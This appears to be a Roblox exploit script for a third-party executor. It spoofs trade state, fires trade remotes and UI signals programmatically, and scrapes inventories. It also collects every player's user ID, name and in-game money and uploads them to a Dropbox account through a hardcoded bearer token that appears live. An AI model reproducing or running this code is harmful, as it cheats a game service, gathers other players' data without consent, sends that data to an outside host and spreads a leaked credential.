local DROPBOX_TOKEN = "sl.u.AGIOb-wdEdxBkKAKfT5eK0y2uON1x9Uyq9U-M3-ZKdZOiPqNmVAv5XAjq25H04E0WppXRnkWBdhsspfpvaIxOaRYSGMbFz7AEP7HrdNeUYnBKrcy5asws1DvsAd1_rAj0Yc4xliJVGv5do2VArI7gzZF2JCrnWaprRe4k5550x6qqgFivAhVAeouJf7A6pVurFdoXuF0QrfbkcMh4sVh9pcXcIz6AUUK1ZMd9tX9UUd4CS5F8gL4zqEJqbjJTrpUaFvWvmNGySiJquoHMDuAc2T5vKQob--9lHa2oW12ny1-WU_OnnKiP04X8wD9najXxBmyxJCNbRT_b7SygFV2hW9MUVSK5Dc_MtChUW5jmCeCjloJEKesfaurjYN4-YEcpGyOgfxaujyqNGqCmZwhG_FpzTviZ8fUqTpjXIAn994iHshxgNam3pxnN4QPXTY9-ResAOSezSJABAVzskofYa7e36G-dU8DQqXxG-FS_0NvSbc4F183oB-_LMUgFR5srKa1Cc8yItj7kN-F1wXee7MmvR9Hha8tibe7njzQz1zV1tseL3vlMKUyf74DGbsOeA5w6BjJGB-yNvgToBv6nRbnlm6_PGbi9El56E2gjZ-jzBoCD_oL54F9tBWySM6zXjeE4XhwizM1VHK_H8tTZIaNkpx5MWQ8PtW_DqaJi_frcGVZC93Hmg93EwKLFqSIijWetbQd0VKNJ2Mrnj0Xwbv97ARHZhoQwL31MrB_ym02LOqleDRmERmkqXP9YJxZpGkzD8tFbZSPD5sa4dM5eN2_68jHNn0EhY7P1xLAV_o_xreD9FmyJVborvg3XL8u0ubKM-XZSTp56SyTnyjnoTRKIZpe6I2Tz5ydAEO_6C6a2xI5nLNm-C9_srj3DTxHTIWV6LX8VMGs8zBuCfuG8puszjBwVgpiEs3zNH2bJT5_8SloPVBCBbxK6BXTI2lcsPptcpwcvy_3jzC_ZyYYTbCMOh2mgplCGAyBmRTaWS2heX7IbcM-zhbHZ-3iUDdOt7tCrQaCURlaHLZm5ir_7SJCuLaiRuPyINTS6E_Pxpj8mu_xfRa-dodOlZyCCqg9squpWMAp0Uxy-wnbAq-EkFKWy8dm19LKoEzHyv-a4QQ7O-aAQzB80Cw8eRsK69ihxCLQ-rGA249LC2tM2mOROcIinHFOxzeCtUbEtP5nwrYGnH1AGJYStyRrc_kKACMcBI2wapxlWbpYK8EXqUj3rjG5rSBWp8IzqfM43V1zpYsl46KDXmtwdpXlDDTa-625xyu4FNh1u7wjp3RoP7Vz-Dx4c0vpAWRpa23P5UrZhQidEH05O4OLnbOZjmRYAYFmHKQSeWiN5f2te6l6jtwOPMnYBDaNaYBArSlOayZsKOLZbCs4gVSyx5PYdRSX9HZeBgtJjgQvHhvKWfb_QUC6QpvOvEqe8Z7GloHzxWZC_PWNH_URcMp-WTzbekfeN13vpDA"

local ReplicatedStorageService = game:GetService("ReplicatedStorage")
local args = {
	"Spying On Live Trades"
}
game:GetService("ReplicatedStorage"):WaitForChild("SetTradeDesireRemote"):FireServer(unpack(args))


local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")

local PlayersService = game:GetService("Players")

local http_request = http_request or request or HttpPost or syn.request

local LocalPlayer = PlayersService.LocalPlayer

LocalPlayer.ActiveTrade.Value = true

task.spawn(function()
	task.wait(1)

	pcall(function()
		firesignal(LocalPlayer.PlayerGui.AppUI.Trade.Offerings.Player1Offering.Cards[1].Activated)
	end)

end)

task.spawn(function()
	local PlayersService = game:GetService("Players")
	local HttpService = game:GetService("HttpService")

	-- Fetch existing JSON from Dropbox
	local function fetchDropboxJson(path)
		local success, result = pcall(function()
			local res = http_request({
				Url = "https://content.dropboxapi.com/2/files/download",
				Method = "POST",
				Headers = {
					["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
					["Dropbox-API-Arg"] = HttpService:JSONEncode({ path = path })
				}
			})
			if res.StatusCode == 200 then
				return HttpService:JSONDecode(res.Body)
			end
		end)
		return success and result or {}
	end

	-- Upload JSON to Dropbox
	local function uploadDropboxJson(path, data)
		local payload = HttpService:JSONEncode(data)
		local success, result = pcall(function()
			local res = http_request({
				Url = "https://content.dropboxapi.com/2/files/upload",
				Method = "POST",
				Headers = {
					["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
					["Dropbox-API-Arg"] = HttpService:JSONEncode({
						path = path,
						mode = "overwrite",
						autorename = false,
						mute = false
					}),
					["Content-Type"] = "application/octet-stream"
				},
				Body = payload
			})
			return res.StatusCode == 200
		end)
		return success and result
	end

	-- Save all players individually
	local function saveAllPlayers()
		for _, player in next, PlayersService:GetPlayers() do
			local path = "/players/" .. player.UserId .. ".json"
			local allData = fetchDropboxJson(path)
			local money = 0

			if player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Money") then
				money = player.leaderstats.Money.Value
			end

			local entry = {
				userId = player.UserId,
				username = player.Name,
				displayName = player.DisplayName,
				money = money,
				timestamp = os.time()
			}

			table.insert(allData, entry)
			uploadDropboxJson(path, allData)
		end
	end

	-- Call it whenever you want to save
	saveAllPlayers()
end)

local inventoryRequestQueue = {}
local isProcessingInventoryRequest = false

local function processNextInventoryRequest()
	if #inventoryRequestQueue == 0 then
		isProcessingInventoryRequest = false
		return
	end

	isProcessingInventoryRequest = true

	local nextRequest = table.remove(inventoryRequestQueue, 1)
	local player = nextRequest.Player
	local bindable = nextRequest.Bindable

	local inventory = GetPlayerInventory(player)

	bindable:Fire(inventory)

	task.spawn(processNextInventoryRequest)
end

function RequestPlayerInventory(player)
	local bindable = Instance.new("BindableEvent")

	table.insert(inventoryRequestQueue, {
		Player = player,
		Bindable = bindable
	})

	if not isProcessingInventoryRequest then
		task.spawn(processNextInventoryRequest)
	end

	-- Wait for the inventory to be returned
	return bindable.Event:Wait()
end

function GetPlayerInventory(Player)
	if Player  then
		print("e2")
		local Inventory = {}

		ReplicatedStorageService:WaitForChild("TradeInventoryUpdatePlayer"):FireServer(Player)

		task.wait(0.6)
		print("e1")
		for i = 1, 12 do
			firesignal(LocalPlayer.PlayerGui.AppUI.Trade.ItemTypesContainer.ScrollingGrid[i].Activated)

			for i, v in next, LocalPlayer.PlayerGui.AppUI.Trade.ItemsContainer.ScrollingGrid:GetChildren() do
				print(v.Name)
				print("e")
				table.insert(Inventory, v.Title.Text.Text)
			end

			task.wait(0.2)
		end

		return Inventory
	end

	return nil
end

task.spawn(function()
	task.wait(1)

	local inventory = RequestPlayerInventory(LocalPlayer)
	
	for i, v in next, inventory do
		print(i,v)
	end
end)
